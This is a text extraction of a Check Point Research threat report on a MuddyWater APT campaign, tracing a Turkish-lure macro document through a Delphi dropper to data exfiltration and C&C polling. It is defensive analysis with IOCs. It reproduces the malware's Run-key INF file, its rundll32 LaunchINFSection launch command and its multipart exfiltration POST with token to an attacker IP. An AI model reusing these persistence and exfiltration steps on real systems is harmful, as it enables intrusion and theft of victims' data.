@@ -1,0 +1,264 @@
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+1/10
+April 10, 2019
+The Muddy Waters of APT Attacks
+research.checkpoint.com/the-muddy-waters-of-apt-attacks
+April 10, 2019
+The Iranian APT, MuddyWater, has been active since at least 2017. Most recently though, a new campaign, targeting Belarus, Turkey and Ukraine, has emerged that
+caught the attention of Check Point researchers.
+ 
+Ever since at least 2017, the attackers behind MuddyWater have used a simple yet effective infection vector: Spear-phishing.
+Attacks usually begin with a targeted email sent to an organization. The next step is to steal legitimate documents from the compromised systems within that
+organization and then weaponize and distribute them to other unsuspecting victims.
+To do this, a lure message that prompts the user to enable their content is added to those ﬁles, which are often carrying logos of real companies or governmental
+entities. The well-crafted and socially engineered malicious documents then become the ﬁrst stage of a long and mainly ﬁleless infection chain that eventually delivers
+POWERSTATS, a signature PowerShell backdoor of this threat group. This powerful backdoor can receive commands from the attackers, enabling it to exﬁltrate ﬁles
+from the system it is running on, execute additional scripts, delete ﬁles, and more.
+While these methods have remained consistent over the years, intermediate stages of this attack have been added, changed and removed due to several security
+vendors now aware of MuddyWater’s tactics, techniques and procedures. In this latest attack, though, and for the ﬁrst time, we see a second stage executable that is not
+written in PowerShell.
+The New Sample
+We initially came across a malicious Word document titled “SPK KANUN DEĞİŞİKLİĞİ GİB GÖRÜŞÜ.doc”, which roughly translates into “SPK (Capital Markets Board
+of Turkey) Law Change.doc”. The document contains macros and tries to convince the victim to enable its content by displaying a decoy message in Turkish:
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+2/10
+Fig 1: Malicious document with macros
+SHA-256: 2f77ec3dd5a5c8146213fdf6ac2df4a25a542cbd809689a5642954f2097e037a
+The blurred image in the background contains a seemingly legitimate description of the law changes that are mentioned in the title. The highlighted words in this image
+might suggest that it was edited in an environment that does not support the Turkish language:
+ 
+Fig 2: Decoy document created in non-Turkish environment
+The Infection Flow
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+3/10
+If the macros in “SPK KANUN DEĞİŞİKLİĞİ GİB GÖRÜŞÜ.doc” are enabled, an embedded payload is decoded and saved in the %APPDATA% directory with the
+name “CiscoAny.exe”.
+The executable is written in Delphi and packed with UPX, contains anti-analysis techniques, and seems to be impersonating a cellular networking tool:
+Copyright             Copyright 2015-2019 A&C Inc.
+ 
+Product               RT 4G Cellular Networking Tool
+ 
+Description           RT 4G Cellular Networking
+ 
+Original Name         RT_Framework.exe
+ 
+Internal Name         RT_4G
+ 
+File Version          1.5.1.1
+ 
+Comments              This application is absloutly free.
+Rather than running this executable immediately, another ﬁle called “CiscoTAP.inf” is created under the same directory with the following content:
+[Version]
+ 
+Signature=$CHICAGO$
+ 
+[DefaultInstall]
+ 
+AddReg=AddRegSection
+ 
+[AddRegSection]
+ 
+HKCU,Software\Microsoft\Windows\CurrentVersion\Run,CiscoAny,,”%APPDATA%\CiscoAny.exe”
+Then, the following command is executed to run the payload:
+“C:\Windows\System32\cmd.exe” /k rundll32.exe ieadvpack.dll,LaunchINFSection %APPDATA%\CiscoTAP.inf,,1,
+This means that the executable will run the next time the user logs in, since it is added to the RUN registry key. IEAdvpack is a Windows 8 DLL, and this command will
+fail to run on certain operating system versions where this DLL is not found. INF ﬁles have been used in the past by MuddyWater, although they were launched using
+Advpack.dll and not IEAdvpack.dll.
+Once executed, the ﬁrst stage creates %APPDATA%\ID.dat, a ﬁle which contains the victim’s unique identiﬁer that is 16 characters long and randomly generated:
+[UID]
+ 
+ID=[VICTIM_ID]
+Later it collects information about the system it is running on, such as the host’s name, the running processes, physical memory, up-time, language, public IP (using
+icanhazip.com) and more.
+All of the above is written to %APPDATA%\Info.txt, and the full information structure can be found in Appendix A below.
+Following the data collection, the executable drops another executable, also named “CiscoAny.exe”, that is hardcoded as a resource, but this time inside the %TEMP%
+folder.
+ 
+The second executable is also UPX packed and written in Delphi:
+Product               Uploader
+ 
+Description           Uploader
+ 
+Original Name         CiscoAny.exe
+ 
+ProgramId             com.embarcadero.Uploader
+ 
+File Version          1.0.0.0
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+4/10
+Finally, the aforementioned ID.dat ﬁle is updated to indicate that the ﬁrst stage of the infection has been successful:
+[UID]
+ 
+ID=[VICTIM_ID]
+ 
+[STAGE]
+ 
+ONE=SUC
+The Second Stage
+The second executable starts by checking the internet connectivity. It sends a request to , and if the connection is successful, it copies the contents of the previously
+created “Info.txt” into %APPDATA%\[UNIQUE_ID].txt
+Fig 3: Second stage instructions
+Then, it will POST the ﬁle containing the system details to 185.117.75[.]116.php:
+—————————–[VICTIM_ID]
+ 
+Content-Disposition: form-data; name=”g3t_f_465″; ﬁlename=”[UNIQUE_ID].txt”
+ 
+Content-Type: application/octet-stream
+[INFO.TXT CONTENT]
+—————————–[VICTIM_ID]
+ 
+Content-Disposition: form-data; name=”t0ken”
+a8s9ydehj323r8ykjqwer@8124e
+ 
+—————————–[VICTIM_ID]–
+The name parameters (“g3t_f_465” and “t0ken”) in this request are determined by the items of the TclHttpRequest object in the TFRMMAIN resource, embedded in
+the executable:
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+5/10
+Fig 3: Embedded conﬁguration
+Returning to the main executable, a request is sent to googleads.hopto[.]org with the victim’s unique ID:
+Fig 6: C&C communication
+The response from the C&C is stored in %APPDATA%\temp.dat, and copied into %APPDATA%\Lib.ps1.
+ 
+The main executable constantly checks for “Lib.ps1” and tries to execute its content.
+At the time of the analysis we were unable to get a response from the C&C but, as previously mentioned,
+POWERSTATS is a common tool for the next stage of the infection.
+Anti-Analysis
+The anti-analysis technique utilized in the ﬁrst executable is quite effective and makes it very hard to analyze this
+sample statically.
+The obfuscation creates a spaghetti-like code, and breaks apart the original code ﬂow to small chunks, with the location
+of the next “real” instruction calculated dynamically.
+Following are examples of such code, where the next instruction location is calculated, and then jumped to (either by “jmp” or “retn”):
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+6/10
+Fig 7: Anti-analysis code fragmentation
+Similarities to MuddyWater
+The document and the embedded macros contained unique strings that enabled us to hunt for other similar samples using them. This resulted in us ﬁnding three recent
+documents that appear to belong to the same campaign, some of which have been attributed to MuddyWater by other researchers:
+Name: 2-Merve_Cooperation_CV.doc
+First Seen: Jan 02, 2019
+ITW: infosystema[.]kg/public/images/ﬁle_library/2-Merve_Cooperation_CV.doc
+SHA-256: c873532e009f2fc7d3b111636f3bbaa3074
+ 
+65e5a99a7f4386bebff2ef8a37a20
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+7/10
+Name: 3-New Law Updated for Client-VMP.doc
+First Seen: Jan 08, 2019
+ITW: As an attachment in two e-mails
+SHA-256: 925225002364615b964e4e3704876d9b101e4f07169dbb
+ 
+459175248aefb5a0ad
+Name: letter-for-Kazakhstan.doc
+First Seen: Jan 16, 2019
+ITW: orbe-fzc[.]com/letter-for-Kazakhstan.doc
+SHA256: c005e11a037210eb8efe12b8dee794be361
+ 
+51de30b0223f2c9c4b9680cb033c0
+In addition, by using VBA2Graph, we were able to visualize the VBA call graph in the macros of each document. This allowed us to quickly notice that the ﬁles share
+many similarities, such as their function names, parameter names, decryption methods and general code ﬂow. For example, the function “UFYYRJSFHX” that writes
+the decoded payload to the ﬁle system appears in all of them.
+We have color coded the functions below, highlighting analogous functions to better show the similarities between the different graphs in this campaign, starting with the
+document from the infection ﬂow we analyzed above:
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+8/10
+Fig 8: Vba2graph correlation within the same campaign
+All those documents are from 2019, but the last two contain unique function names (“F38HUYFLSF985HFUISHS” and “SSSDS98746GB”) that were also observed in
+MuddyWater documents dating back to November 2018, allowing us to see a connection between different campaigns:
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+9/10
+Fig 9: Vba2graph correlation to a different campaign
+MuddyWater Anomalies
+While we can see a clear connection between the previous samples, there are some differences between them and the common delivery documents which are usually
+attributed to this highly active threat group.
+For example, if we consider their appearance, and although this is not always the case, MuddyWater documents usually include a generic decoy message in English
+telling the victim to enable their content. This is missing from two of the previous samples, and written in Turkish in the third one.
+Furthermore, if we continue to compare the macros of different documents, we will notice that a sample we discovered this month and attributed to MuddyWater uses
+another function naming convention in its macros (four lowercase letters, instead of a mix of uppercase letters and numerals):
+Figure 10: Vba2graph of a parallel recent campaign
+SHA-256: 08e256cd2fa027552be253ec3bf427b537977f9123adf1f36e7cd2843a057554
+This deviates completely from the previous documents we looked into, but was also found in other MuddyWater samples from the recent months:
+Fig 11: Vba2graph of a parallel recent campaign
+ 
+SHA-256: 93b749082651d7fc0b3caa9df81bad7617b3bd4475de58acfe953dfafc7b3987
+It therefore seems that the same attackers are running parallel campaigns, which use at least two different macro generators for the ﬁrst stage of the attack.
+Conclusion
+Although it has focused most of its efforts on the Middle East region, the political afﬁliations, motives and purposes behind MuddyWater’s attacks are not very well-
+deﬁned, thus earning it its name. In the past, countries such as Saudi Arabia, the UAE and Turkey have been a main target, but the campaigns have also reached a
+much wider audience, making their way to victims in countries such as Belarus and Ukraine.
+The attackers are also constantly innovating and experimenting with new techniques, and the extra layers which they add before delivering their signature payload make
+it harder to attribute an attack to them with high conﬁdence. Just recently, we spotted two DOCX ﬁles that take advantage of the external template technique to download
+the macro-equipped and familiar delivery documents of MuddyWater from remote hosts.
+To conclude then, the attack we describe above shows an infection ﬂow that we do not usually expect to see from MuddyWater, but it will not be surprising to see them
+introduce more changes in the near future.
+——————————————————————————————————————————————————————————————————————————————
+Check Point’s Threat Emulation
+The malware used in this attack was caught using Check Point’s Threat Emulation.
+4/20/2019
+The Muddy Waters of APT Attacks - Check Point Research
+https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/
+10/10
+Threat Emulation is an innovative zero-day threat sandboxing capability, used by SandBlast Network to deliver the best possible catch rate for threats, and is virtually
+immune to attackers’ evasion techniques. As part of the Check Point SandBlast Zero-Day Protection solution, Threat Emulation prevents infections from new malware
+and targeted attacks.
+Appendix A
+IP Address : [IP_ADDRESS]
+HDD Information :
+H.D.D Name : [HOST_NAME]
+Process List :
+ 
+0 = [PROCESS_NAME_0]
+ 
+1 = [PROCESS_NAME_1]
+ 
+2 = [PROCESS_NAME_2]
+ 
+3 = [PROCESS_NAME_3]
+ 
+4 = [PROCESS_NAME_4]
+ 
+5 = [PROCESS_NAME_5]
+ 
+6 = [PROCESS_NAME_6]
+ 
+7 = [PROCESS_NAME_7]
+ 
+8 = [PROCESS_NAME_8]
+ 
+9 = [PROCESS_NAME_9]
+ 
+10 = [PROCESS_NAME_10]
+Memory information :
+ 
+[%] memory in use
+ 
+[KB] of physical memory
+ 
+[KB] of available physical memory
+ 
+[KB] that can be stored in the paging ﬁle
+ 
+[KB] available in the paging ﬁle
+Language Is :English (United States)
+ 
+Uptime: 1 Days 1 Hours 1 Minutes 1 Second
+ 
+ 
